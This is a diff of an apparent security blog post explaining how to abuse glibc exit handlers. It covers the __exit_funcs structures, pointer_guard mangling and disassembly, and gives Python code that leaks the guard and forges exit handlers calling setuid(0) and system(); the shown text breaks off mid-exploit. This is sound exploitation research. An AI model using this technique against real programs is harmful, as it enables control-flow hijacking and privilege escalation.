@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -150,7 +130,8 @@ with atexit() and on_exit() before calling the _exit() syscall.</p>
 <span class="nf">exit</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">__run_exit_handlers</span> <span class="p">(</span><span class="n">status</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__exit_funcs</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>exit() is just a nicely named wrapper for “__run_exit_handlers()”.</p>
 
@@ -299,7 +280,8 @@ with atexit() and on_exit() before calling the _exit() syscall.</p>
     <span class="n">RUN_HOOK</span> <span class="p">(</span><span class="n">__libc_atexit</span><span class="p">,</span> <span class="p">());</span>
 
   <span class="n">_exit</span> <span class="p">(</span><span class="n">status</span><span class="p">);</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We can see that “__run_exit_handlers()” does use pointer demangling by using
 PTR_DEMANGLE() before dereferencing the function pointers and calling
@@ -386,7 +368,8 @@ we’ll come back to it.</p>
     <span class="k">struct</span> <span class="n">exit_function_list</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
     <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span>
     <span class="k">struct</span> <span class="n">exit_function</span> <span class="n">fns</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-  <span class="p">};</span></pre></td></tr></tbody></table></code></pre></figure>
+  <span class="p">};</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Each handler can have 5 flavors : ef_free, ef_us, ef_on, ef_at and ef_cxa.
 Depending on the flavor of the exit handler, we’ll have a function pointer,
@@ -420,7 +403,8 @@ idx is the total number of functions and is 1-based (not 0-based as usually).</p
          : "=r" (var)         \
          : "0" (var),         \
            "i" (offsetof (tcbhead_t,       \
-            pointer_guard)))</span></pre></td></tr></tbody></table></code></pre></figure>
+            pointer_guard)))</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Here we can see that it uses the “pointer_guard” offset in
 the structure “tcbhead_t” in order to access the pointer_guard in fs,
@@ -593,7 +577,8 @@ Dump of assembler code for function __run_exit_handlers:
    0x000000000003a01d &lt;+269&gt;: mov    rdi,r13
    0x000000000003a020 &lt;+272&gt;: call   0x1f8a8
    0x000000000003a025 &lt;+277&gt;: jmp    0x39f27 &lt;__run_exit_handlers&gt;
-End of assembler dump.</pre></td></tr></tbody></table></code></pre></figure>
+End of assembler dump.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>In case you missed it, the code that really interest us is this:</p>
 
@@ -602,7 +587,8 @@ End of assembler dump.</pre></td></tr></tbody></table></code></pre></figure>
 3
 </pre></td><td class="code"><pre>   0x0000000000039fe9 &lt;+217&gt;: ror    rdx,0x11
    0x0000000000039fed &lt;+221&gt;: xor    rdx,QWORD PTR fs:0x30
-   0x0000000000039ff6 &lt;+230&gt;: call   rdx</pre></td></tr></tbody></table></code></pre></figure>
+   0x0000000000039ff6 &lt;+230&gt;: call   rdx
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>So what’s stored at fs:X?
 Let’s look at Thread Control Block.</p>
@@ -675,7 +661,8 @@ structure “tcbhead_t”.</p>
   <span class="n">__128bits</span> <span class="n">__glibc_unused2</span><span class="p">[</span><span class="mi">8</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">32</span><span class="p">)));</span>
 
   <span class="kt">void</span> <span class="o">*</span><span class="n">__padding</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
-<span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="where-is-that-pointer_guard-setted-up">Where is that pointer_guard setted up?</h1>
 
@@ -696,7 +683,8 @@ structure “tcbhead_t”.</p>
 </span>  <span class="n">THREAD_SET_POINTER_GUARD</span> <span class="p">(</span><span class="n">pointer_chk_guard</span><span class="p">);</span>
 <span class="cp"># else
 </span>  <span class="n">__pointer_chk_guard_local</span> <span class="o">=</span> <span class="n">pointer_chk_guard</span><span class="p">;</span>
-<span class="cp"># endif</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="cp"># endif</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We could go look the code at “_dl_setup_pointer_guard()” but research was not
 done there.</p>
@@ -724,7 +712,8 @@ Let’s start with __exit_funcs.</p>
 <span class="p">{</span>
   <span class="k">return</span> <span class="n">__internal_atexit</span> <span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__exit_funcs</span><span class="p">);</span>
 <span class="p">}</span>
-<span class="n">ibc_hidden_def</span> <span class="p">(</span><span class="n">__cxa_atexit</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">ibc_hidden_def</span> <span class="p">(</span><span class="n">__cxa_atexit</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>And the corresponding assembly.</p>
 
@@ -781,7 +770,8 @@ Dump of assembler code for function __GI___cxa_atexit:
    0x000000000003a2c7 &lt;+71&gt;: ret    
    0x000000000003a2c8 &lt;+72&gt;: mov    eax,0xffffffff
    0x000000000003a2cd &lt;+77&gt;: jmp    0x3a2c3 &lt;__gi___cxa_atexit&gt;
-End of assembler dump.&lt;/__gi___cxa_atexit&gt;&lt;/__gi___cxa_atexit&gt;&lt;/__new_exitfn&gt;&lt;/__exit_funcs&gt;</pre></td></tr></tbody></table></code></pre></figure>
+End of assembler dump.&lt;/__gi___cxa_atexit&gt;&lt;/__gi___cxa_atexit&gt;&lt;/__new_exitfn&gt;&lt;/__exit_funcs&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>What’s interesting is “__exit_funcs” being used.
 “__exit_funcs” is an un-exported function but we can resolve it by disassembling
@@ -818,26 +808,27 @@ You can see at VA 0x3a28a that it calculates the address of “__exit_funcs”.<
 </pre></td><td class="code"><pre><span class="c1"># get __exit_funcs addr
 </span><span class="k">def</span> <span class="nf">get_exit_funcs</span> <span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
     <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span> <span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
-    <span class="n">md</span><span class="o">.</span><span class="n">detail</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">md</span><span class="p">.</span><span class="n">detail</span> <span class="o">=</span> <span class="bp">True</span>
 
     <span class="c1"># look for ptr offset
 </span>    <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="bp">None</span>
-    <span class="k">for</span> <span class="n">inst</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span> <span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">off</span><span class="p">:],</span> <span class="n">off</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">inst</span><span class="o">.</span><span class="n">mnemonic</span> <span class="o">!=</span> <span class="s">'lea'</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">inst</span> <span class="ow">in</span> <span class="n">md</span><span class="p">.</span><span class="n">disasm</span> <span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">off</span><span class="p">:],</span> <span class="n">off</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">inst</span><span class="p">.</span><span class="n">mnemonic</span> <span class="o">!=</span> <span class="s">'lea'</span><span class="p">:</span>
             <span class="k">continue</span>
-        <span class="k">for</span> <span class="n">operand</span> <span class="ow">in</span> <span class="n">inst</span><span class="o">.</span><span class="n">operands</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">operand</span> <span class="ow">in</span> <span class="n">inst</span><span class="p">.</span><span class="n">operands</span><span class="p">:</span>
 
-            <span class="k">if</span> <span class="n">operand</span><span class="o">.</span><span class="nb">type</span> <span class="o">==</span> <span class="n">x86</span><span class="o">.</span><span class="n">X86_OP_MEM</span><span class="p">:</span>
-                <span class="k">if</span> <span class="n">inst</span><span class="o">.</span><span class="n">reg_name</span> <span class="p">(</span><span class="n">operand</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">base</span><span class="p">)</span> <span class="o">!=</span> <span class="s">'rip'</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">operand</span><span class="p">.</span><span class="nb">type</span> <span class="o">==</span> <span class="n">x86</span><span class="p">.</span><span class="n">X86_OP_MEM</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">inst</span><span class="p">.</span><span class="n">reg_name</span> <span class="p">(</span><span class="n">operand</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">mem</span><span class="p">.</span><span class="n">base</span><span class="p">)</span> <span class="o">!=</span> <span class="s">'rip'</span><span class="p">:</span>
                     <span class="k">continue</span>
-                <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">inst</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">operand</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">disp</span>
+                <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="n">inst</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">inst</span><span class="p">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">operand</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">mem</span><span class="p">.</span><span class="n">disp</span>
                 <span class="k">break</span>
         <span class="k">if</span> <span class="n">ptr_exit_funcs</span><span class="p">:</span>
             <span class="k">break</span>
 
     <span class="k">if</span> <span class="n">ptr_exit_funcs</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">None</span>
-    <span class="k">return</span> <span class="n">ptr_exit_funcs</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="k">return</span> <span class="n">ptr_exit_funcs</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>I’ll show at the end of the article how to use it to bypass pointer mangling.
 Let’s first have a look at tls_dtor_list.</p>
@@ -894,7 +885,8 @@ to look at.</p>
       <span class="n">atomic_fetch_add_release</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_tls_dtor_count</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
       <span class="n">free</span> <span class="p">(</span><span class="n">cur</span><span class="p">);</span>
     <span class="p">}</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The part that really interest us is about tls_dtor_list being used.</p>
 
@@ -957,7 +949,8 @@ Dump of assembler code for function __GI___call_tls_dtors:
    0x000000000003a622 &lt;+98&gt;: pop    rbx
    0x000000000003a623 &lt;+99&gt;: pop    rbp
    0x000000000003a624 &lt;+100&gt;: ret    
-End of assembler dump.&lt;/__gi___call_tls_dtors&gt;&lt;/__gi___call_tls_dtors&gt;</pre></td></tr></tbody></table></code></pre></figure>
+End of assembler dump.&lt;/__gi___call_tls_dtors&gt;&lt;/__gi___call_tls_dtors&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You can see at VA 0x3a5c6 that it dereferences the pointer to tls_dtor_list.
 So we can disassemble that function and find that offset using capstone.
@@ -984,7 +977,8 @@ Here we use _dl_fini encoded pointer.</p>
 is used is as follow:</p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span><span class="n">ptr_encoded</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">^</span> <span class="n">_dl_fini</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span><span class="n">ptr_encoded</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">^</span> <span class="n">_dl_fini</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Here the code you’ve been waiting for. We re-use “get_exit_funcs()” that
 was showed earlier.</p>
@@ -1039,26 +1033,27 @@ was showed earlier.</p>
 <span class="c1"># get libc data
 </span><span class="n">content</span> <span class="o">=</span> <span class="s">''</span>
 <span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="n">libc_filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
-    <span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span> <span class="p">()</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">read</span> <span class="p">()</span>
 
 <span class="c1"># get our exit_funcs address
-</span><span class="n">off_cxa_atexit</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__cxa_atexit'</span><span class="p">]</span>
+</span><span class="n">off_cxa_atexit</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__cxa_atexit'</span><span class="p">]</span>
 <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">get_exit_funcs</span> <span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">off_cxa_atexit</span><span class="p">)</span>
 <span class="n">off_exit_funcs</span> <span class="o">=</span> <span class="n">ptr_exit_funcs</span> <span class="o">-</span> <span class="n">start_data</span>
-<span class="n">__exit_funcs</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_exit_funcs</span><span class="p">:</span><span class="n">off_exit_funcs</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">__exit_funcs</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_exit_funcs</span><span class="p">:</span><span class="n">off_exit_funcs</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
 <span class="c1"># our encoded pointer location
 </span><span class="n">off_ptr_encoded</span> <span class="o">=</span> <span class="p">(</span><span class="n">__exit_funcs</span> <span class="o">-</span> <span class="n">start_data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span>
-<span class="n">ptr_encoded</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_ptr_encoded</span><span class="p">:</span><span class="n">off_ptr_encoded</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">ptr_encoded</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_ptr_encoded</span><span class="p">:</span><span class="n">off_ptr_encoded</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
 <span class="c1"># this is used to encode pointers
 </span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span><span class="n">ptr_encoded</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">^</span> <span class="n">_dl_fini</span>
 
 <span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[+] Leak __exit_funcs'</span>
-<span class="k">print</span> <span class="s">'start_data               : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">start_data</span>
-<span class="k">print</span> <span class="s">'ptr_exit_funcs           : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_exit_funcs</span>
-<span class="k">print</span> <span class="s">'exit_funcs               : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">__exit_funcs</span>
-<span class="k">print</span> <span class="s">'off_ptr_encoded          : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">off_ptr_encoded</span>
-<span class="k">print</span> <span class="s">'ptr_encoded              : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_encoded</span>
-<span class="k">print</span> <span class="s">'ptr_guard                : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_guard</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="k">print</span> <span class="s">'start_data               : 0x%016x'</span> <span class="o">%</span> <span class="n">start_data</span>
+<span class="k">print</span> <span class="s">'ptr_exit_funcs           : 0x%016x'</span> <span class="o">%</span> <span class="n">ptr_exit_funcs</span>
+<span class="k">print</span> <span class="s">'exit_funcs               : 0x%016x'</span> <span class="o">%</span> <span class="n">__exit_funcs</span>
+<span class="k">print</span> <span class="s">'off_ptr_encoded          : 0x%016x'</span> <span class="o">%</span> <span class="n">off_ptr_encoded</span>
+<span class="k">print</span> <span class="s">'ptr_encoded              : 0x%016x'</span> <span class="o">%</span> <span class="n">ptr_encoded</span>
+<span class="k">print</span> <span class="s">'ptr_guard                : 0x%016x'</span> <span class="o">%</span> <span class="n">ptr_guard</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Now that we got the pointer_guard, what do we do?</p>
 
@@ -1112,38 +1107,38 @@ was showed earlier.</p>
 46
 </pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">CxaFunc</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">ptr_guard</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">func</span> <span class="o">=</span> <span class="n">func</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">arg</span> <span class="o">=</span> <span class="n">arg</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">func</span> <span class="o">=</span> <span class="n">func</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">arg</span> <span class="o">=</span> <span class="n">arg</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>
 
     <span class="k">def</span> <span class="nf">__str__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="c1"># flavor = 4 (ef_cxa) + func + arg + NULL (dso handle)
-</span>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">:</span>
-            <span class="n">encoded</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">func</span> <span class="o">^</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+</span>        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">ptr_guard</span><span class="p">:</span>
+            <span class="n">encoded</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">func</span> <span class="o">^</span> <span class="bp">self</span><span class="p">.</span><span class="n">ptr_guard</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="n">encoded</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">func</span>
-        <span class="k">print</span> <span class="s">'func : 0x</span><span class="si">%016</span><span class="s">x | encoded : 0x</span><span class="si">%016</span><span class="s">x | arg : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">func</span><span class="p">,</span> <span class="n">encoded</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arg</span><span class="p">)</span>
+            <span class="n">encoded</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">func</span>
+        <span class="k">print</span> <span class="s">'func : 0x%016x | encoded : 0x%016x | arg : 0x%016x'</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">func</span><span class="p">,</span> <span class="n">encoded</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">arg</span><span class="p">)</span>
   <span class="c1"># ef_cxa == 4 | encoded function pointer | argument | dso handle set to NULL
-</span>        <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">encoded</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arg</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span>        <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">encoded</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">arg</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">data</span>
 
 <span class="k">class</span> <span class="nc">ExitHandlers</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ptr_guard</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span> <span class="o">=</span> <span class="nb">list</span> <span class="p">()</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">handlers</span> <span class="o">=</span> <span class="nb">list</span> <span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>
 
     <span class="k">def</span> <span class="nf">append</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
-        <span class="n">cxafunc</span> <span class="o">=</span> <span class="n">CxaFunc</span> <span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">cxafunc</span><span class="p">)</span>
+        <span class="n">cxafunc</span> <span class="o">=</span> <span class="n">CxaFunc</span> <span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">ptr_guard</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">handlers</span><span class="p">.</span><span class="n">append</span> <span class="p">(</span><span class="n">cxafunc</span><span class="p">)</span>
 
     <span class="k">def</span> <span class="nf">__str__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="s">''</span>
         <span class="c1"># next = NULL
-</span>        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span>        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
         <span class="c1"># idx = number of handlers
-</span>        <span class="k">print</span> <span class="s">'Packing </span><span class="si">%</span><span class="s">d handlers'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">)</span>
-        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">))</span>
-        <span class="k">for</span> <span class="n">cxafunc</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">:</span>
+</span>        <span class="k">print</span> <span class="s">'Packing %d handlers'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">handlers</span><span class="p">)</span>
+        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">handlers</span><span class="p">))</span>
+        <span class="k">for</span> <span class="n">cxafunc</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">handlers</span><span class="p">:</span>
             <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="nb">str</span> <span class="p">(</span><span class="n">cxafunc</span><span class="p">)</span>
 
         <span class="k">return</span> <span class="n">fake_exit_funcs</span>
@@ -1151,11 +1146,12 @@ was showed earlier.</p>
 <span class="c1"># build our exit_funcs functions list
 </span><span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="n">ExitHandlers</span> <span class="p">(</span><span class="n">ptr_guard</span><span class="p">)</span>
 <span class="c1"># setuid
-</span><span class="n">fake_exit_funcs</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_setuid</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class="n">fake_exit_funcs</span><span class="p">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_setuid</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 <span class="c1"># system and get cmd
 </span><span class="k">for</span> <span class="n">heap_addr</span> <span class="ow">in</span> <span class="n">heap_addrs</span><span class="p">:</span>
-    <span class="n">fake_exit_funcs</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_system</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
